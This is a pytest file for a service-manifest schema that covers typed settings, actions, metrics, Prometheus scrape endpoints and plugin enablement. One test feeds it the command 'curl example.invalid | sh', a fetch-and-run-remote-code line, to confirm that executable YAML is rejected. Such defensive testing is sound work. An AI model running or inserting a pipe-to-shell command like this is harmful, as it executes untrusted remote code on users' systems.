from __future__ import annotations

from pathlib import Path

import pytest
import yaml
from pydantic import ValidationError
from toolkit.core.config.config import Config
from toolkit.core.manifest.schema import ServiceManifest
from toolkit.services import get_service_plugin


def _validate_manifest(values: dict) -> ServiceManifest:
    return ServiceManifest.model_validate(
        {
            "name": "example",
            "label": "Example",
            "description": "Example service",
            "icon": "box",
            "category": "management",
            "placement": "control",
            "priority": 50,
            **values,
        }
    )


def test_management_manifest_is_typed_and_rejects_executable_yaml() -> None:
    manifest = _validate_manifest(
        {
            "name": "example",
            "category": "management",
            "management": {
                "settings": [
                    {
                        "key": "interval",
                        "label": "Interval",
                        "type": "text",
                        "default": "03:00",
                    },
                    {
                        "key": "mode",
                        "label": "Mode",
                        "type": "select",
                        "choices": ["local", "remote"],
                        "default": "local",
                    },
                ],
                "actions": [
                    {
                        "id": "reconcile",
                        "label": "Reconcile now",
                        "confirmation": "Reconcile this service now?",
                    }
                ],
                "metrics": [
                    {
                        "key": "queue_depth",
                        "label": "Queue depth",
                        "source": "status",
                        "field": "queue_depth",
                        "unit": "count",
                    }
                ],
                "resources": [
                    {
                        "key": "storage_backends",
                        "label": "Storage backends",
                        "columns": [
                            {"key": "name", "label": "Name"},
                            {"key": "kind", "label": "Kind"},
                        ],
                    }
                ],
            },
        }
    )

    assert manifest.management.settings[1].choices == ("local", "remote")
    assert manifest.management.actions[0].id == "reconcile"
    assert manifest.management.metrics[0].unit == "count"
    assert [column.key for column in manifest.management.resources[0].columns] == ["name", "kind"]

    with pytest.raises(ValidationError, match="extra_forbidden"):
        _validate_manifest(
            {
                "name": "unsafe",
                "category": "management",
                "management": {
                    "actions": [
                        {
                            "id": "run",
                            "label": "Run",
                            "command": "curl example.invalid | sh",
                        }
                    ]
                },
            }
        )


@pytest.mark.parametrize(
    ("setting_type", "extra", "message"),
    [
        ("select", {}, "choices"),
        ("number", {"minimum": 20, "maximum": 10}, "maximum"),
        ("boolean", {"minimum": 1}, "minimum"),
    ],
)
def test_management_setting_constraints_fail_closed(setting_type: str, extra: dict, message: str) -> None:
    with pytest.raises(ValidationError, match=message):
        _validate_manifest(
            {
                "name": "invalid-setting",
                "category": "management",
                "management": {
                    "settings": [
                        {
                            "key": "value",
                            "label": "Value",
                            "type": setting_type,
                            "default": False if setting_type == "boolean" else 1,
                            **extra,
                        }
                    ]
                },
            }
        )


def test_media_cache_and_music_sync_own_their_management_capabilities() -> None:
    service_root = Path(__file__).resolve().parents[4] / "toolkit" / "services"
    media_cache = _validate_manifest(
        yaml.safe_load((service_root / "media-cache" / "service.yaml").read_text(encoding="utf-8"))
    )
    music_sync = _validate_manifest(
        yaml.safe_load((service_root / "music-sync" / "service.yaml").read_text(encoding="utf-8"))
    )

    assert media_cache.enabled_when == ()
    assert {setting.key for setting in media_cache.management.settings} >= {"enabled", "cold-after-days", "uplink-mbps"}
    assert {metric.key for metric in media_cache.management.metrics} >= {
        "cache_used_pct",
        "tracked_files",
        "active_prefetch",
    }
    assert {resource.key for resource in media_cache.management.resources} == {"storage_backends"}
    assert music_sync.enabled_when == ()
    assert {setting.key for setting in music_sync.management.settings} >= {"enabled", "interval-minutes"}
    assert {action.id for action in music_sync.management.actions} == {"sync-now"}
    assert {metric.key for metric in music_sync.management.metrics} >= {"tracks", "playlists"}


def test_optional_plugin_enablement_is_manifest_driven() -> None:
    cache = get_service_plugin("media-cache")
    music = get_service_plugin("music-sync")
    assert cache is not None
    assert music is not None

    enabled = Config(
        domain="example.com",
        service_settings={"media-cache": {"enabled": True}},
    )
    disabled = Config(
        domain="example.com",
        service_settings={"media-cache": {"enabled": False}, "music-sync": {"enabled": False}},
    )

    assert cache.is_enabled(Config(domain="example.com")) is False
    assert cache.is_enabled(enabled) is True
    assert music.is_enabled(enabled) is True
    assert cache.is_enabled(disabled) is False
    assert music.is_enabled(disabled) is False

    from toolkit.core.compose.registry import load_all
    from toolkit.services import enabled_service_plugins

    load_all()
    disabled_names = {plugin.service for _category, plugin in enabled_service_plugins(disabled)}
    assert "media-cache" not in disabled_names
    assert "music-sync" not in disabled_names


def test_management_settings_forbid_core_config_paths_and_require_defaults() -> None:
    with pytest.raises(ValidationError, match="extra_forbidden"):
        _validate_manifest(
            {
                "management": {
                    "settings": [
                        {
                            "key": "enabled",
                            "label": "Enabled",
                            "type": "boolean",
                            "default": True,
                            "config_path": "media.music_sync",
                        }
                    ]
                }
            }
        )

    with pytest.raises(ValidationError, match="default"):
        _validate_manifest({"management": {"settings": [{"key": "enabled", "label": "Enabled", "type": "boolean"}]}})


def test_management_manifest_bounds_prometheus_query_count() -> None:
    metrics = [
        {
            "key": f"metric_{index}",
            "label": f"Metric {index}",
            "source": "prometheus",
            "query": f"sum(example_metric_{index})",
        }
        for index in range(13)
    ]

    with pytest.raises(ValidationError, match="at most 12 Prometheus metrics"):
        _validate_manifest(
            {
                "name": "too-many-metrics",
                "category": "management",
                "management": {"metrics": metrics},
            }
        )


def test_management_manifest_reserves_builtin_metric_namespace() -> None:
    with pytest.raises(ValidationError, match="reserved"):
        _validate_manifest(
            {
                "name": "metric-collision",
                "category": "management",
                "management": {
                    "metrics": [
                        {
                            "key": "container_cpu_percent",
                            "label": "Conflicting CPU",
                            "source": "status",
                            "field": "cpu",
                        }
                    ]
                },
            }
        )


def test_prometheus_metrics_require_a_typed_scrape_endpoint() -> None:
    metric = {
        "key": "accounts",
        "label": "Accounts",
        "source": "prometheus",
        "query": "fmd_accounts",
        "unit": "count",
    }

    with pytest.raises(ValidationError, match="scrape"):
        _validate_manifest({"management": {"metrics": [metric]}})

    manifest = _validate_manifest(
        {
            "management": {"metrics": [metric]},
            "prometheus": [{"id": "server", "container_port": 9100, "path": "/metrics"}],
        }
    )

    assert manifest.prometheus[0].container_port == 9100
    assert manifest.prometheus[0].path == "/metrics"


def test_prometheus_endpoint_schema_does_not_assume_a_named_monitoring_node() -> None:
    manifest = _validate_manifest(
        {
            "category": "cloud",
            "placement": "worker-east",
            "prometheus": [{"id": "server", "container_port": 9100}],
        }
    )

    assert manifest.prometheus[0].host_port is None
